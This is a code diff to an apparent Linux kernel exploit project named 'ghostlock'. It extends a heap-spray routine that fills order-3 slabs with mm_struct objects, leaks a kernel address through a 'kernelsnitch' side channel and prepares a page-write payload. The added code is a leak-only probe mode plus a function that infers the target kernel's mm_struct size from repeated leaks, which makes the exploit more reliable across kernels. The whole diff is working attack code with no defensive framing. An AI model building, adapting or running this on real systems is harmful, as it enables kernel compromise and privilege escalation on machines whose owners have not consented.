@@ -8,6 +8,7 @@
 #include "support/native_resource.hpp"
 #include "kernel/target.h"
 #include "kernelsnitch/kernelsnitch.h"
+#include "kernelsnitch/stride_verify.h"
 
 /* Session aliases kept from the preprocessor era: the attack statements were
  * written with these short names, and references preserve every call site
@@ -656,7 +657,7 @@ namespace ghostlock::support {
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
      * paths, then delete this comment and the residual row. */
-    uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
+    uintptr_t prepare_kernel_page(const memory::WriteRequest *request, bool leak_only) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
         /* Release every userspace reference from the preceding write before the
@@ -664,7 +665,20 @@ namespace ghostlock::support {
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
         close_reclaim_sockets();
         cleanup_page_prepare_state();
-        mm_objs_per_slab = kernel::ORDER3_SIZE / kernel::MM_STRUCT_SZ;
+        /* The profile's measured stride sizes the spray. A value outside the
+         * sane range is treated as absent and the compiled default applies;
+         * the leak itself stays stride-agnostic. */
+        uint32_t spray_stride = kernel::MM_STRUCT_SZ;
+        const profile::kernel_offsets *stride_values = profile_values();
+        if (stride_values && stride_values->misc.mm_struct_sz) {
+            const uint32_t candidate = *stride_values->misc.mm_struct_sz;
+            if (candidate >= 64 && candidate <= kernel::ORDER3_SIZE) {
+                spray_stride = candidate;
+            }
+        }
+        mm_objs_per_slab = kernel::ORDER3_SIZE / spray_stride;
+        pr_info("[spray] mm_struct stride=%u objects_per_slab=%zu\n",
+                spray_stride, mm_objs_per_slab);
         prepare_ctxs();
 
         session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
@@ -682,7 +696,7 @@ namespace ghostlock::support {
 
         int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
         /* The leak scans a stride-agnostic grid (32 primary, 8 last resort;
-         * 4 KiB outer). The fixed MM_STRUCT_SZ only sizes the spray, so an
+         * 4 KiB outer). The measured stride sizes the spray only, so an
          * imprecise value shapes the heap slightly differently but cannot
          * hide the mm from the leak. */
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
@@ -804,6 +818,22 @@ namespace ghostlock::support {
         }
 
         uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
+        if (leak_only) {
+            /* Probe round: the mm_struct leak is the whole result. Tear the
+             * spray down exactly as the payload path does at its tail, minus
+             * the page write and the reclaim sockets, then hand the base back;
+             * the caller reads the offset from last_mm_struct. */
+            pr_info("[stride] mm_struct leaked=0x%zx +%lldms\n",
+                    leaked, ms_since(&t_spray));
+            snitch.reset();
+            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+                SYSCHK(close(prepare_ctx.memfds[i]));
+                prepare_ctx.memfds[i] = -1;
+                kill_child(prepare_ctx.childs[i]);
+            }
+            cleanup_page_prepare_state();
+            return base;
+        }
         if (!prepare_skb_payload(base, request)) {
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
@@ -930,5 +960,42 @@ namespace ghostlock::support {
                        max_attempts, ms_since(&t_good));
         }
         return 0;
+    }
+
+    bool probe_mm_stride(std::size_t sizeof_mm, std::size_t max_rounds) {
+        kernelsnitch::StrideVerifier verifier(sizeof_mm);
+        const std::size_t max_attempts = max_rounds * 2;
+        std::size_t attempts = 0;
+        while (verifier.rounds() < max_rounds && !verifier.decided() &&
+               attempts < max_attempts) {
+            attempts++;
+            const uintptr_t base = prepare_kernel_page(nullptr, true);
+            if (base == 0) {
+                pr_warning("[stride] leak round failed (attempt %zu/%zu)\n",
+                           attempts, max_attempts);
+                continue;
+            }
+            const uintptr_t leaked =
+                    session::g_exploit_session.heap.current.last_mm_struct;
+            const auto offset = static_cast<std::size_t>(
+                leaked & (kernel::ORDER3_SIZE - 1));
+            verifier.add_offset(offset);
+            pr_info("[stride] round=%zu offset=0x%zx\n",
+                    verifier.rounds(), offset);
+        }
+        pr_info("[stride] summary rounds=%zu samples=%zu gcd=0x%zx "
+                "candidates=%zu decided=%d attempts=%zu\n",
+                verifier.rounds(), verifier.samples(), verifier.gcd(),
+                verifier.voted_count(), verifier.decided() ? 1 : 0, attempts);
+        for (std::size_t i = 0; i < verifier.voted_count(); i++) {
+            const kernelsnitch::StrideCandidateVote candidate = verifier.voted(i);
+            pr_info("[stride] candidate value=%zu votes=%zu/%zu objects=%zu\n",
+                    candidate.value, candidate.votes, verifier.samples(),
+                    kernel::ORDER3_SIZE / candidate.value);
+        }
+        if (!verifier.any_votes()) {
+            pr_warning("[stride] no candidate: no round produced a vote\n");
+        }
+        return verifier.decided();
     }
 } // namespace ghostlock::support
